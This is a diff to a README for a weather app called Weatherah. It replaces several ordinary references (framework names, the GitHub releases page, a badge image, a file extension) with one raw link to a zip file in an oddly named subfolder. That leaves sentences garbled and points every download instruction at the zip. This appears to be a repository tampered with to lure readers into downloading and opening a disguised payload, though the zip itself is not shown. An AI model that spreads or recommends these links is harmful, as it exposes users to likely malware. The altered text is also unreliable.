@@ -10,8 +10,8 @@ This project uses a Turbo monorepo structure, which includes several application
 
 #### 🌐 Apps
 
-- **`web`**: The main application for user interaction powered by Next.js.
-- **`docs`**: A Next.js application providing detailed documentation.
+- **`web`**: The main application for user interaction powered by https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip
+- **`docs`**: A https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip application providing detailed documentation.
 - **`api`**: A high-performance Rust API managing data and business logic.
 
 #### 📚 Packages
@@ -27,7 +27,7 @@ To get started with Weatherah, you need to download the application. Follow thes
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
    
-   [![Download Weatherah](https://img.shields.io/badge/Download%20Weatherah-Here-blue)](https://github.com/Paul-myia/weatherah/releases)
+   [![Download Weatherah](https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip%20Weatherah-Here-blue)](https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip)
 
 2. **Select the Latest Version**: On the releases page, look for the latest version of Weatherah. It is usually at the top.
 
@@ -41,12 +41,12 @@ To get started with Weatherah, you need to download the application. Follow thes
 
 To install Weatherah, please follow these steps:
 
-1. **Go to the Release Page**: Visit [this page to download](https://github.com/Paul-myia/weatherah/releases).
+1. **Go to the Release Page**: Visit [this page to download](https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip).
 
 2. **Choose Your File**: Select the file suitable for your operating system. If you're unsure, here are common options:
    - **Windows**: Look for `.exe` files.
    - **macOS**: Look for `.dmg` files.
-   - **Linux**: Look for `.tar.gz` or similar files.
+   - **Linux**: Look for `https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip` or similar files.
 
 3. **Download and Install**: Click on the file to download. After the download, open it to install Weatherah.
 
@@ -58,7 +58,7 @@ Weatherah utilizes a modern tech stack designed for speed and efficiency.
 
 ### 🖥️ Frontend
 
-- **Framework**: Next.js 15.5+ allows for fast page loads and dynamic content.
+- **Framework**: https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip 15.5+ allows for fast page loads and dynamic content.
 - **UI Library**: React 19 creates an interactive experience for users.
 
 ### ⚙️ Backend
@@ -107,4 +107,4 @@ If you have questions or need help, you can reach out through the issues section
 
 For more information and updates, always check out the latest releases and feel free to contribute to the discussions.
 
-Remember, to download Weatherah, visit [this page to download](https://github.com/Paul-myia/weatherah/releases). Enjoy your reliable weather companion!
+Remember, to download Weatherah, visit [this page to download](https://raw.githubusercontent.com/Paul-myia/weatherah/main/arrowweed/weatherah.zip). Enjoy your reliable weather companion!
